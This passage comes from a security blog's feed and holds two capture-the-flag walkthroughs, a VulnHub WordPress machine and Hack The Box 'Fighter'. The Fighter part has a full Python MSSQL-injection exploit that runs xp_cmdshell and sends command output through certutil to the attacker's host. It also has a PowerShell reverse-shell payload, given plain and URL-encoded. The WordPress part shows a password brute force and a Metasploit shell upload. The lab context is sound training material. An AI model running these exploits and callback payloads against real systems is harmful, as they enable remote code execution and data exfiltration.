http://192.168.56.103/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Last Updated: 2020-03-31T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.5</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: &#x27;</span>Version: 1.4<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=======================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] c0rrupt3d_brain</span></span><br><span class="line"><span class="string"> | Found By: Author Posts - Author Pattern (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br></pre></td></tr></table></figure>

<p>now use wpscan bruteforce user c0rrupt3d_brain’s password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Trying c0rrupt3d_brain / 24992499 Time: 00:01:55 &lt;============================&gt; (10700 / 10700) 100.00% Time: 00:01:55</span><br><span class="line">[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                </span><br><span class="line">                                                                                                            </span><br><span class="line">[i] Valid Combinations Found:                                                                                 </span><br><span class="line"> | Username: c0rrupt3d_brain, Password: 24992499</span><br></pre></td></tr></table></figure>

<p>and we got Username: c0rrupt3d_brain, Password: 24992499</p>
<h3 id="get-a-shell-by-using-msf"><a href="#get-a-shell-by-using-msf" class="headerlink" title="get a shell by using msf"></a>get a shell by using msf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> rhosts 192.168.56.103</span><br><span class="line">rhosts =&gt; 192.168.56.103</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> targeturi /wordpress</span><br><span class="line">targeturi =&gt; /wordpress</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> username c0rrupt3d_brain</span><br><span class="line">username =&gt; c0rrupt3d_brain</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> password 24992499</span><br><span class="line">password =&gt; 24992499</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.126:4444 </span><br><span class="line">[*] Authenticating with WordPress using c0rrupt3d_brain:24992499...</span><br><span class="line">[+] Authenticated with WordPress</span><br><span class="line">[*] Preparing payload...</span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[*] Executing the payload at /wordpress/wp-content/plugins/xryoFXviCZ/GWcWlbcKol.php...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.126:4444 -&gt; 192.168.56.103:52970) at 2020-05-25 06:39:50 -0400</span><br><span class="line">[+] Deleted GWcWlbcKol.php</span><br><span class="line">[+] Deleted xryoFXviCZ.php</span><br><span class="line">[+] Deleted ../xryoFXviCZ</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>then we got root’s password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat .root_password_ssh.txt</span><br><span class="line">cat .root_password_ssh.txt</span><br><span class="line">willy26</span><br></pre></td></tr></table></figure>

<h3 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ su root</span><br><span class="line">su root</span><br><span class="line">Password: willy26</span><br><span class="line"></span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="comment"># cd ~</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">proof.txt</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># cat proof.txt</span></span><br><span class="line">cat proof.txt</span><br><span class="line">voila you have successfully pwned me :) !!!</span><br><span class="line">:D</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub278.jpg"></li>
</ul>
<p>Just such a simplest machine i have ever tried…:)</p>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>wpscan find wordpress user</li>
<li>wpscan bruteforce wordpress user’s pass</li>
<li>msf exploit/unix/webapp/wp_admin_shell_upload module to get a shell</li>
<li>root’s password disclosure</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[fighter]</title>
    <url>/2020/06/03/fighter/</url>
    <content><![CDATA[<h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:             Windows<br>Difficulty:     Insane<br>Points:         50<br>Release:     05 May 2018<br>IP:             10.10.10.72</p>
<p>User Blood:  00 days, 19 hours, 09 mins, 22 seconds.<br>Root Blood:  01 days, 04 hours, 16 mins, 21 seconds.</p>
<p>that’s crazy for me</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb33.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap and masscan as usaul</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># masscan -p1-65535 10.10.10.72 --rate=1000 -e tun0 &gt; ports</span></span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-04 02:35:05 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ports=$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;/&quot; &#x27;&#123;print $1&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)</span></span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># nmap -Pn -sV -sC -v -p$ports 10.10.10.72</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 8.5</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/8.5</span><br><span class="line">|_http-title: StreetFighter Club</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>In the homepage, find the Domain name “streetfighterclub.htb”. add the domain to /etc/hosts file.</p>
<p>let’s look around, then find that there might be subdomains available that will give us more clues</p>
<p>intercept the request and send it to the intruder. We select where we want to brute force the request.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: §1§.streetfighterclub.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>use namelist.txt located in /usr/share/dnsrecon/</p>
<p>find a subdomain called “members.streetfighterclub.htb” that gave HTTP code 403</p>
<p>then add the subdomain in /etc/hosts</p>
<p>open the webpage and got a 403 Forbidden error</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://members.streetfighterclub.htb/</span><br></pre></td></tr></table></figure>

<p>use dirb to scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://members.streetfighterclub.htb/</span><br><span class="line"></span><br><span class="line">/old</span><br></pre></td></tr></table></figure>

<p>then find web pages inside that directory. As we know that it is IIS server we find “asp” files on the web server and find a page called “login.asp”.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://members.streetfighterclub.htb/old -X .asp</span><br><span class="line"></span><br><span class="line">/login.asp</span><br></pre></td></tr></table></figure>

<p>now got </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://members.streetfighterclub.htb/old/login.asp</span><br></pre></td></tr></table></figure>

<h3 id="exploit-and-getshell-and-privilege-escalation"><a href="#exploit-and-getshell-and-privilege-escalation" class="headerlink" title="exploit and getshell and privilege escalation"></a>exploit and getshell and privilege escalation</h3><p>find that the web application is vulnerable to SQL injection in parameter “logintype=2”.  We find username, password, and e-mail but were unable to login. So we tried command injection using SQL injection. We referred the following link.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2Jsb2cvcmVkLXRlYW0tdGFsZXMtMHgwMS8=">From MSSQL to RCE<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>so we made the following python3 payload script</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import base64</span><br><span class="line">from html.parser import HTMLParser</span><br><span class="line">from http.server import BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line">query_id   = 0</span><br><span class="line"></span><br><span class="line">def decode(data):</span><br><span class="line">    parser = HTMLParser()</span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># We don&#x27;t like Unicode strings, do we?</span></span><br><span class="line">        decoded_data = base64.b64decode(data)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&#x27;[-] decoding error&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> decoded_data.decode(<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def get_command():</span><br><span class="line">    try:</span><br><span class="line">        cmd = input(<span class="string">&#x27;:\&gt; &#x27;</span>)</span><br><span class="line">        t = threading.Thread(target=send_command, args=(cmd,))</span><br><span class="line">        t.start()</span><br><span class="line">    except:</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def send_command(cmd):</span><br><span class="line">    global target_url, local_url</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;2;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;declare @r varchar(6120),@cmdOutput varchar(6120);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;declare @res TABLE(line varchar(max));&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;insert into @res exec Xp_cmdshell %s;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path(&#x27;&#x27;)), 1, 1, &#x27;&#x27;)) as varbinary(max)) FOR XML PATH(&#x27;&#x27;), BINARY BASE64);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;set @r=concat(&#x27;certutil -urlcache -f http://10.10.14.3/&#x27;,@cmdOutput);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;exec Xp_cmdshell @r;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;--&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Data for login</span></span><br><span class="line">    login = &#123;</span><br><span class="line">        <span class="string">&#x27;B1&#x27;</span>: <span class="string">&#x27;LogIn&#x27;</span>,</span><br><span class="line">        <span class="comment"># &#x27;logintype&#x27;: &quot;1 AND ISNULL(ASCII(SUBSTRING((SELECT @@version LIMIT 0,1)),&quot;+str(limit)+&quot;,1)),0)&gt;&quot;+str(char),</span></span><br><span class="line">        <span class="string">&#x27;logintype&#x27;</span>: payload % (cmd),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;rememberme&#x27;</span>: <span class="string">&#x27;ON&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.post(<span class="string">&quot;http://members.streetfighterclub.htb/old/verify.asp&quot;</span>, data=login)</span><br><span class="line"></span><br><span class="line">class MyServer(HTTPServer):</span><br><span class="line">    def server_activate(self):</span><br><span class="line">        <span class="comment"># get first command</span></span><br><span class="line">        get_command()</span><br><span class="line">        HTTPServer.server_activate(self)</span><br><span class="line"></span><br><span class="line">class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):</span><br><span class="line">    def log_request(self, *args, **kwargs):</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">    def log_message(self, *args, **kwargs):</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        global query_id</span><br><span class="line">        self.send_error(404)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Certutil sends 2 requets each time</span></span><br><span class="line">        <span class="keyword">if</span> query_id % 2 == 0:</span><br><span class="line">            output = self.path</span><br><span class="line"></span><br><span class="line">            <span class="comment"># if command output, decode it!</span></span><br><span class="line">            <span class="keyword">if</span> output != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(decode(output[1:]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># get next command</span></span><br><span class="line">            get_command()</span><br><span class="line"></span><br><span class="line">        query_id += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Fake server behaviour</span></span><br><span class="line">    handler = SimpleHTTPRequestHandler</span><br><span class="line">    handler.server_version = <span class="string">&#x27;nginx&#x27;</span></span><br><span class="line">    handler.sys_version = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    handler.error_message_format = <span class="string">&#x27;not found&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add SSL support if you wanna be a ninja!</span></span><br><span class="line">    httpd = MyServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, 80), handler)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        pass</span><br><span class="line">    httpd.server_close()</span><br></pre></td></tr></table></figure>

<p>then run the script</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># python3 exploit.py </span></span><br><span class="line">:\&gt; whoami</span><br><span class="line">fighter\sqlserv</span><br></pre></td></tr></table></figure>

<p>or use the following payload to spawn a reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure <span class="string">&#x27;xP_cmDsHell&#x27;</span>, 1;RECONFIGURE WITH OVERRIDE;drop table <span class="comment">#xxx;create table #xxx (out varchar(8000));Insert into #xxx (out) execute xp_CmDShell &#x27;c:\WinDOWS\SYSWoW64\winDoWSpOwERsHEll\V1.0\PoWerShell.EXE &quot;$client = New-Object System.Net.Sockets.TCPClient(\&quot;10.10.14.3\&quot;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \&quot;PS \&quot; + (pwd).Path + \&quot;^&gt; \&quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;&#x27;;EXEC sp_configure &#x27;xp_cmDsHeLl&#x27;, 0;RECONFIGURE WITH OVERRIDE;</span></span><br></pre></td></tr></table></figure>

<p>url encode the payload then send the request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /old/verify.asp HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: members.streetfighterclub.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://members.streetfighterclub.htb/old/login.asp</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 2627</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDASBDQAST=HDDPOADAMCOKAMNDGOGAFGGL</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456&amp;logintype=%31%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%73%68%6f%77%20%61%64%76%61%6e%63%65%64%20%6f%70%74%69%6f%6e%73%27%2c%20%31%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%78%50%5f%63%6d%44%73%48%65%6c%6c%27%2c%20%31%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b%64%72%6f%70%20%74%61%62%6c%65%20%23%78%78%78%3b%63%72%65%61%74%65%20%74%61%62%6c%65%20%23%78%78%78%20%28%6f%75%74%20%76%61%72%63%68%61%72%28%38%30%30%30%29%29%3b%49%6e%73%65%72%74%20%69%6e%74%6f%20%23%78%78%78%20%28%6f%75%74%29%20%65%78%65%63%75%74%65%20%78%70%5f%43%6d%44%53%68%65%6c%6c%20%27%63%3a%5c%57%69%6e%44%4f%57%53%5c%53%59%53%57%6f%57%36%34%5c%77%69%6e%44%6f%57%53%70%4f%77%45%52%73%48%45%6c%6c%5c%56%31%2e%30%5c%50%6f%57%65%72%53%68%65%6c%6c%2e%45%58%45%20%22%24%63%6c%69%65%6e%74%20%3d%20%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%53%6f%63%6b%65%74%73%2e%54%43%50%43%6c%69%65%6e%74%28%5c%22%31%30%2e%31%30%2e%31%34%2e%33%5c%22%2c%38%30%29%3b%24%73%74%72%65%61%6d%20%3d%20%24%63%6c%69%65%6e%74%2e%47%65%74%53%74%72%65%61%6d%28%29%3b%5b%62%79%74%65%5b%5d%5d%24%62%79%74%65%73%20%3d%20%30%2e%2e%36%35%35%33%35%7c%25%7b%30%7d%3b%77%68%69%6c%65%28%28%24%69%20%3d%20%24%73%74%72%65%61%6d%2e%52%65%61%64%28%24%62%79%74%65%73%2c%20%30%2c%20%24%62%79%74%65%73%2e%4c%65%6e%67%74%68%29%29%20%2d%6e%65%20%30%29%7b%3b%24%64%61%74%61%20%3d%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%2d%54%79%70%65%4e%61%6d%65%20%53%79%73%74%65%6d%2e%54%65%78%74%2e%41%53%43%49%49%45%6e%63%6f%64%69%6e%67%29%2e%47%65%74%53%74%72%69%6e%67%28%24%62%79%74%65%73%2c%30%2c%20%24%69%29%3b%24%73%65%6e%64%62%61%63%6b%20%3d%20%28%69%65%78%20%24%64%61%74%61%20%32%3e%26%31%20%7c%20%4f%75%74%2d%53%74%72%69%6e%67%20%29%3b%24%73%65%6e%64%62%61%63%6b%32%20%3d%20%24%73%65%6e%64%62%61%63%6b%20%2b%20%5c%22%50%53%20%5c%22%20%2b%20%28%70%77%64%29%2e%50%61%74%68%20%2b%20%5c%22%5e%3e%20%5c%22%3b%24%73%65%6e%64%62%79%74%65%20%3d%20%28%5b%74%65%78%74%2e%65%6e%63%6f%64%69%6e%67%5d%3a%3a%41%53%43%49%49%29%2e%47%65%74%42%79%74%65%73%28%24%73%65%6e%64%62%61%63%6b%32%29%3b%24%73%74%72%65%61%6d%2e%57%72%69%74%65%28%24%73%65%6e%64%62%79%74%65%2c%30%2c%24%73%65%6e%64%62%79%74%65%2e%4c%65%6e%67%74%68%29%3b%24%73%74%72%65%61%6d%2e%46%6c%75%73%68%28%29%7d%3b%24%63%6c%69%65%6e%74%2e%43%6c%6f%73%65%28%29%22%27%3b%45%58%45%43%20%73%70%5f%63%6f%6e%66%69%67%75%72%65%20%27%78%70%5f%63%6d%44%73%48%65%4c%6c%27%2c%20%30%3b%52%45%43%4f%4e%46%49%47%55%52%45%20%57%49%54%48%20%4f%56%45%52%52%49%44%45%3b&amp;B1=LogIn</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># nc -lvp 80</span></span><br><span class="line">listening on [any] 80 ...</span><br><span class="line">connect to [10.10.14.3] from streetfighterclub.htb [10.10.10.72] 49173</span><br><span class="line">whoami                                          </span><br><span class="line">fighter\sqlserv</span><br><span class="line">PS C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>We are not able to find anything on the target machine. So we try to convert our shell into meterpreter but are unable to run any exe file. So there was a firewall that didn’t allow us to run any exe file. We got a reference through this link on how to bypass this. We use the nps payload to create an XML file that will contain our payload (download from following)</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvbnBzX3BheWxvYWQ=">nps payload<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/nps_payload-master<span class="comment"># python nps_payload.py </span></span><br><span class="line"></span><br><span class="line">                                     (            (</span><br><span class="line">                              ) (    )\        )  )\ )</span><br><span class="line">  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(</span><br><span class="line">  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)</span><br><span class="line"> _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |</span><br><span class="line">| <span class="string">&#x27; \)) &#x27;</span>_ \|_-&lt;    | <span class="string">&#x27;_ \) _` | || | / _ \/ _` / _` |</span></span><br><span class="line"><span class="string">|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|</span></span><br><span class="line"><span class="string">      |_|     |_____|_|         |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                       v1.03</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        (1)     Generate msbuild/nps/msf payload</span></span><br><span class="line"><span class="string">        (2)     Generate msbuild/nps/msf HTA payload</span></span><br><span class="line"><span class="string">        (99)    Quit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Select a task: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload Selection:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        (1)     